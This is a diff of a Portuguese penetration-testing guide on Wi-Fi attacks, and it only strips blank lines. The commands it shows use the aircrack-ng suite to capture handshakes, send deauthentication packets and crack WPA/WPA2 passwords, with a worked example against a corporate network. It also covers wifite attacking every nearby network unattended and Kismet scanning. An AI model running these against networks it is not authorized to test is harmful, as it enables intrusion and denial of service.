@@ -26,25 +26,19 @@ Esta seção desvia-se do paradigma de redes cabeadas (TCP/IP) para operar diret
 
 ```bash
 # Ativação do modo monitor na interface sem fio, encerrando processos conflitantes previamente
-
 sudo airmon-ng check kill
-
 sudo airmon-ng start [interface_sem_fio]
 
 # Varredura e captura de tráfego de todas as redes próximas visíveis no alcance de rádio
-
 sudo airodump-ng [interface_em_modo_monitor]
 
 # Captura direcionada a uma rede específica (BSSID e canal), salvando os pacotes em arquivo
-
 sudo airodump-ng --bssid [MAC_do_roteador] --channel [canal] -w [arquivo_captura] [interface_em_modo_monitor]
 
 # Injeção de pacotes de desautenticação para forçar a reconexão de um cliente (e captura do handshake)
-
 sudo aireplay-ng --deauth [numero_de_pacotes] -a [MAC_do_roteador] -c [MAC_do_cliente] [interface_em_modo_monitor]
 
 # Quebra offline da senha WPA/WPA2 a partir do handshake capturado, utilizando uma wordlist
-
 aircrack-ng [arquivo_captura.cap] -w [wordlist.txt]
 ```
 
@@ -54,11 +48,8 @@ aircrack-ng [arquivo_captura.cap] -w [wordlist.txt]
 
 ```bash
 sudo airmon-ng start wlan0
-
 sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w captura_corp wlan0mon
-
 sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
-
 aircrack-ng captura_corp-01.cap -w wordlist_techcorp_wifi.txt
 ```
 
@@ -78,19 +69,15 @@ aircrack-ng captura_corp-01.cap -w wordlist_techcorp_wifi.txt
 
 ```bash
 # Execução padrão, iniciando a varredura interativa de todas as redes próximas disponíveis
-
 sudo wifite
 
 # Execução direcionada a um alvo específico pelo BSSID, ignorando o menu de seleção interativo
-
 sudo wifite --bssid [MAC_do_roteador]
 
 # Execução restringindo o escopo exclusivamente a ataques contra o protocolo WPS
-
 sudo wifite --wps
 
 # Execução em modo não interativo, atacando automaticamente todos os alvos elegíveis sem confirmação manual
-
 sudo wifite --all --kill
 ```
 
@@ -113,19 +100,14 @@ sudo wifite --all --kill
 
 ```bash
 # Inicialização do servidor especificando a interface de captura sem fio a ser utilizada
-
 sudo kismet -c [interface_sem_fio]
 
 # Inicialização com múltiplas fontes de captura simultâneas (ex: Wi-Fi e Bluetooth)
-
 sudo kismet -c [interface_wifi] -c [interface_bluetooth]
 
 # Acesso à interface web de visualização e análise (padrão: porta 2501)
-
 # Navegador: http://localhost:2501
-
 # Consulta programática direta aos dispositivos detectados via API REST do Kismet
-
 curl -s http://localhost:2501/devices/all_devices.json -u [usuario]:[senha]
 ```
 
